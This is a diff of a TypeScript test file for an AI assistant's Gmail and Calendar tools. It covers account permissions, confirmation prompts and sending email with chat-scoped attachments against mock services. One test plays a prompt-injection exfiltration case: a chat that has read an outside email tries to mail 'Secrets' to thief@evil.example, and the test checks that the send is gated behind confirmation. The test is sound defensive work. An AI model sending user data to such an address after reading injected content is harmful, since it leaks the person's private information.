@@ -4,13 +4,16 @@
  * sending, calendar events, Drive files. Fake Google endpoints and the
  * pretend mail service; no real account.
  */
-import { mkdtemp, rm } from 'node:fs/promises';
+import { mkdtemp, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 
 import type { OAuth2Client } from 'google-auth-library';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 
+import type { Attachment, TaintSource } from '@conch/protocol';
+
+import { filesOf } from '../channels/outbound';
 import { MockMail } from '../channels/mock/email';
 import type { ToolContext } from '../conversations/manager';
 import type { HostTool } from '../engines/types';
@@ -227,8 +230,8 @@ describe('accounts, each with its own access', () => {
     const raw = await legacy.read();
     expect(raw.version).toBe(GOOGLE_STORE_VERSION);
     expect(raw.limits.old1).toEqual({ gmail: 'write', calendar: 'read' });
-    // Sending didn't exist before: it starts off, so nothing newly reaches out unasked.
-    expect(raw.apps.gmail?.tools.google_mail_send).toBe('off');
+    // Sending follows the account's level and asks first, like every new setup (ADR 0104).
+    expect(raw.apps.gmail?.tools.google_mail_send).toBeUndefined();
     expect((await service.status()).accounts[0]?.capabilities).toEqual([
       'mail-read',
       'mail-draft',
@@ -244,8 +247,9 @@ describe('which account a call means', () => {
     await signIn(['mail-read']);
     expect((await pickAccount(service, undefined, 'mail-read')).id).toBe('work1');
     expect((await pickAccount(service, 'ADA@work.example', 'mail-read')).id).toBe('work1');
+    // The one account says why, in words the model can pass on, with the way to change it.
     await expect(pickAccount(service, undefined, 'mail-send')).rejects.toThrow(
-      /None of the connected Google accounts may send email/,
+      /ada@work\.example yet: this sign-in is read only\. .*Apps → Gmail → Google accounts/,
     );
     await expect(pickAccount(service, 'ada@work.example', 'mail-send')).rejects.toThrow(
       /hasn’t allowed Conch to send email/,
@@ -335,7 +339,9 @@ describe('changes Conch makes, each asked first', () => {
     await signIn(['calendar-read']);
     const { ctx, ask } = context();
     const create = tool(googleTools(service, ctx), 'google_calendar_create_event');
-    await expect(create.run(event)).rejects.toThrow(/may change Google Calendar/);
+    await expect(create.run(event)).rejects.toThrow(
+      /Google hasn’t allowed Conch to change Google Calendar.*Apps → Google Calendar → Google accounts/,
+    );
     expect(ask).not.toHaveBeenCalled();
   });
 
@@ -470,7 +476,7 @@ describe('changes Conch makes, each asked first', () => {
 });
 
 describe('Google apps show what each account may do', () => {
-  it('offers write tools only where an account may write, and they always ask', async () => {
+  it('offers write tools only where an account may write, and they ask first', async () => {
     granted = scopesOf('mail-send', 'calendar-read');
     await signIn(['mail-send', 'calendar-read']);
     const apps = new GoogleApps(service, { emit: () => undefined, manualChecks: true });
@@ -481,9 +487,11 @@ describe('Google apps show what each account may do', () => {
     expect(names).toContain('google_calendar_briefing');
     expect(names).not.toContain('google_calendar_create_event');
     expect(apps.decide('mcp__conch__google_mail_send')).toBe('allow');
-    await expect(apps.update('gmail', { tools: { google_mail_send: 'allow' } })).rejects.toThrow(
-      /always asks/,
-    );
+    expect(apps.chosen('google_mail_send')).toBeUndefined();
+    // A calendar change still always asks: Allow isn't one of its choices.
+    await expect(
+      apps.update('google-calendar', { tools: { google_calendar_create_event: 'allow' } }),
+    ).rejects.toThrow();
     expect((await apps.get('gmail')).transport).toMatchObject({
       how: 'One account, read & write, with Google sign-in',
     });
@@ -493,5 +501,287 @@ describe('Google apps show what each account may do', () => {
       'google_mail_send',
     );
     apps.stop();
+  });
+});
+
+describe('sending email, end to end (ADR 0104)', () => {
+  const PDF = Buffer.from('%PDF-1.4 the invoice');
+  /** The chat's own files, as `filesOf` gives them to message_user: by id, never a path. */
+  const chatFiles = async () => {
+    const path = join(home, 'invoice.pdf');
+    await writeFile(path, PDF);
+    const store = {
+      inConversation: async (id: string, conversationId: string) =>
+        id === 'att_invoice1' && conversationId === 'c1'
+          ? {
+              path,
+              attachment: {
+                id,
+                name: 'invoice.pdf',
+                mimeType: 'application/pdf',
+                kind: 'file',
+              } as unknown as Attachment,
+            }
+          : undefined,
+    };
+    return (ids: readonly string[]) => filesOf(store, ids, 'c1');
+  };
+  /** A chat that has, or hasn't, read something from outside. */
+  function chat(read: TaintSource[] = [], answer: 'allow' | 'deny' = 'allow') {
+    const ask = vi.fn(async () => answer);
+    const ctx = {
+      conversationId: 'c1',
+      ask,
+      signal: new AbortController().signal,
+      taints: () => read,
+      untrusted: () => (read.length ? 'This chat read an email.' : undefined),
+    } as unknown as ToolContext;
+    return { ask, ctx };
+  }
+
+  it('an app-password account set to Read & write is offered sending, and it goes over SMTP with its files', async () => {
+    await service.connectPassword({
+      address: MockMail.ADDRESS,
+      password: MockMail.PASSWORD,
+      access: 'write',
+    });
+    const apps = new GoogleApps(service, { emit: () => undefined, manualChecks: true });
+    await apps.refresh();
+    const { ctx, ask } = chat();
+    const options = { chosen: (n: string) => apps.chosen(n), files: await chatFiles() };
+    const tools = apps.tools(googleTools(service, ctx, undefined, options), ctx);
+    expect(tools.map((t) => t.name)).toContain('google_mail_send');
+    const send = tool(tools, 'google_mail_send');
+    expect(send.description).not.toMatch(/no attachments/i);
+    const out = JSON.parse(
+      text(
+        await send.run(
+          {
+            to: ['sam@example.org'],
+            subject: 'Invoice for March',
+            body: 'Here is the invoice.',
+            attachments: ['att_invoice1'],
+          },
+          { operationId: 'op-smtp' },
+        ),
+      ),
+    );
+    expect(out).toMatchObject({ state: 'confirmed', receipt: { label: 'Sent from Gmail' } });
+    // One question, showing From, To, the files and the words.
+    expect(ask).toHaveBeenCalledOnce();
+    expect(ask).toHaveBeenCalledWith(
+      expect.objectContaining({
+        toolName: 'google_mail_send',
+        once: true,
+        input: expect.objectContaining({
+          accountEmail: MockMail.ADDRESS,
+          to: ['sam@example.org'],
+          files: ['invoice.pdf'],
+        }),
+        summary: expect.stringContaining(`from ${MockMail.ADDRESS}`),
+      }),
+    );
+    expect(mail.sent).toHaveLength(1);
+    const sent = mail.sent[0];
+    expect(sent).toMatchObject({
+      from: MockMail.ADDRESS,
+      to: ['sam@example.org'],
+      subject: 'Invoice for March',
+      text: 'Here is the invoice.',
+    });
+    expect(sent?.raw).toMatch(new RegExp(`^From: ${MockMail.ADDRESS}$`, 'm'));
+    expect(sent?.files).toEqual([
+      { name: 'invoice.pdf', type: 'application/pdf', size: PDF.length, inline: false },
+    ]);
+    apps.stop();
+  });
+
+  it('refuses a file that isn’t this chat’s, before asking or sending', async () => {
+    await service.connectPassword({
+      address: MockMail.ADDRESS,
+      password: MockMail.PASSWORD,
+      access: 'write',
+    });
+    const { ctx, ask } = chat();
+    const send = tool(
+      googleTools(service, ctx, undefined, { files: await chatFiles() }),
+      'google_mail_send',
+    );
+    await expect(
+      send.run({ to: ['sam@example.org'], subject: 'x', body: 'x', attachments: ['att_other99'] }),
+    ).rejects.toThrow(/no file .* in this chat/i);
+    expect(ask).not.toHaveBeenCalled();
+    expect(mail.sent).toHaveLength(0);
+  });
+
+  it('a Google sign-in sends through Gmail’s API, and a big email is uploaded whole', async () => {
+    granted = scopesOf('mail-send');
+    await signIn(['mail-send']);
+    fetcher.mockImplementation(async (_url, init) =>
+      init?.method === 'POST' ? new Response('{"id":"sent2","threadId":"t2"}') : new Response('{}'),
+    );
+    const big = Buffer.alloc(4_000_000, 7);
+    const { ctx } = chat();
+    const send = tool(
+      googleTools(service, ctx, undefined, {
+        files: async () => [{ name: 'photos.zip', mimeType: 'application/zip', bytes: big }],
+      }),
+      'google_mail_send',
+    );
+    const out = JSON.parse(
+      text(
+        await send.run({
+          to: ['sam@example.org'],
+          subject: 'Photos',
+          body: 'All of them.',
+          attachments: ['att_photos1'],
+        }),
+      ),
+    );
+    expect(out).toMatchObject({ state: 'confirmed', receipt: { id: 'sent2' } });
+    const [url, init] = calls('POST')[0] ?? [];
+    expect(String(url)).toBe(
+      'https://www.googleapis.com/upload/gmail/v1/users/me/messages/send?uploadType=multipart',
+    );
+    expect(new Headers(init?.headers).get('content-type')).toMatch(
+      /^multipart\/related; boundary=/,
+    );
+    const body = String(init?.body);
+    expect(body).toContain('Content-Type: message/rfc822');
+    expect(body).toMatch(/^From: ada@work.example$/m);
+    expect(body).toContain('filename="photos.zip"');
+  });
+
+  it('sends from the account the person names, and shows a guessed one first even when allowed', async () => {
+    granted = scopesOf('mail-send');
+    await signIn(['mail-send']);
+    await service.connectPassword({
+      address: MockMail.ADDRESS,
+      password: MockMail.PASSWORD,
+      access: 'write',
+    });
+    const apps = new GoogleApps(service, { emit: () => undefined, manualChecks: true });
+    await apps.refresh();
+    await apps.update('gmail', { tools: { google_mail_send: 'allow' } });
+    const { ctx, ask } = chat();
+    const send = tool(
+      googleTools(service, ctx, undefined, { chosen: (n) => apps.chosen(n) }),
+      'google_mail_send',
+    );
+    // Named: that account, and (allowed, nothing read) no question.
+    await send.run({
+      accountId: MockMail.ADDRESS,
+      to: ['sam@example.org'],
+      subject: 'From the pro account',
+      body: 'Hi',
+    });
+    expect(ask).not.toHaveBeenCalled();
+    expect(mail.sent.at(-1)).toMatchObject({ from: MockMail.ADDRESS });
+    // Not named, two can send: the first is used, and the person sees which before it goes.
+    fetcher.mockImplementation(async (_url, init) =>
+      init?.method === 'POST' ? new Response('{"id":"sent3"}') : new Response('{}'),
+    );
+    await send.run({ to: ['sam@example.org'], subject: 'Which one?', body: 'Hi' });
+    expect(ask).toHaveBeenCalledOnce();
+    expect(ask).toHaveBeenCalledWith(
+      expect.objectContaining({
+        input: expect.objectContaining({ accountEmail: 'ada@work.example' }),
+      }),
+    );
+    apps.stop();
+  });
+
+  it('Allow still asks once the chat read something from outside; the person’s own Ask stays explicit', async () => {
+    await service.connectPassword({
+      address: MockMail.ADDRESS,
+      password: MockMail.PASSWORD,
+      access: 'write',
+    });
+    const apps = new GoogleApps(service, { emit: () => undefined, manualChecks: true });
+    await apps.refresh();
+    await apps.update('gmail', { tools: { google_mail_send: 'allow' } });
+    const read = chat([{ kind: 'app', label: 'Gmail' }], 'deny');
+    const send = tool(
+      googleTools(service, read.ctx, undefined, { chosen: (n) => apps.chosen(n) }),
+      'google_mail_send',
+    );
+    const args = { to: ['thief@evil.example'], subject: 'Secrets', body: 'All of them' };
+    expect(await send.run(args)).toMatchObject({ effect: 'not-executed' });
+    expect(read.ask).toHaveBeenCalledWith(
+      expect.objectContaining({ taint: 'This chat read an email.', once: true }),
+    );
+    expect(mail.sent).toHaveLength(0);
+
+    await apps.update('gmail', { tools: { google_mail_send: 'ask' } });
+    const { ctx, ask } = chat();
+    await tool(
+      googleTools(service, ctx, undefined, { chosen: (n) => apps.chosen(n) }),
+      'google_mail_send',
+    ).run({ to: ['sam@example.org'], subject: 'Hi', body: 'Hi' });
+    // Set to Ask by the person: Auto keeps asking (explicit), Full trust still decides.
+    expect(ask).toHaveBeenCalledWith(expect.objectContaining({ explicit: true, once: true }));
+    apps.stop();
+  });
+
+  it('a read-only setup refuses in plain words, with what to do', async () => {
+    await service.connectPassword({ address: MockMail.ADDRESS, password: MockMail.PASSWORD });
+    const apps = new GoogleApps(service, { emit: () => undefined, manualChecks: true });
+    await apps.refresh();
+    const { ctx, ask } = chat();
+    expect(apps.tools(googleTools(service, ctx), ctx).map((t) => t.name)).not.toContain(
+      'google_mail_send',
+    );
+    const send = tool(googleTools(service, ctx), 'google_mail_send');
+    await expect(send.run({ to: ['sam@example.org'], subject: 'x', body: 'x' })).rejects.toThrow(
+      /can’t send email\. The person can change that in Apps → Gmail → Google accounts \(Read & write\)\. Offer that, or a draft instead\./,
+    );
+    expect(ask).not.toHaveBeenCalled();
+    expect(mail.sent).toHaveLength(0);
+    apps.stop();
+  });
+
+  it('takes back version 2’s own “send off”, so Read & write can send again', async () => {
+    await service.connectPassword({
+      address: MockMail.ADDRESS,
+      password: MockMail.PASSWORD,
+      access: 'write',
+    });
+    // As ADR 0099's migration left it: version 2, sending switched off by Conch itself.
+    await store.update((data) => {
+      data.version = 2;
+      data.apps.gmail = {
+        enabled: true,
+        policy: 'ask-writes',
+        tools: { google_mail_send: 'off' },
+        hidden: false,
+      };
+    });
+    const data = await store.read();
+    expect(data.version).toBe(GOOGLE_STORE_VERSION);
+    expect(data.apps.gmail?.tools.google_mail_send).toBeUndefined();
+    const apps = new GoogleApps(service, { emit: () => undefined, manualChecks: true });
+    await apps.refresh();
+    expect(apps.decide('google_mail_send')).toBe('allow');
+    // A choice made since is the person's, and stays.
+    await apps.update('gmail', { tools: { google_mail_send: 'off' } });
+    expect((await store.read()).apps.gmail?.tools.google_mail_send).toBe('off');
+    expect(apps.decide('google_mail_send')).toBe('off');
+    apps.stop();
+  });
+
+  it('“Use an app password instead” moves Gmail to it, and the sign-in keeps Calendar', async () => {
+    who = { sub: 'pro1', email: MockMail.ADDRESS };
+    granted = scopesOf('mail-read', 'calendar-read');
+    await signIn(['mail-read', 'calendar-read']);
+    await service.connectPassword({
+      address: MockMail.ADDRESS,
+      password: MockMail.PASSWORD,
+      access: 'write',
+    });
+    const accounts = (await service.status()).accounts;
+    expect(accounts.find((a) => a.via === 'google')?.access).toEqual({ calendar: 'read' });
+    expect(accounts.find((a) => a.via === 'app-password')?.access).toEqual({ gmail: 'write' });
+    // Gmail has one account for the address: the one that can send.
+    expect((await pickAccount(service, MockMail.ADDRESS, 'mail-send')).via).toBe('app-password');
   });
 });
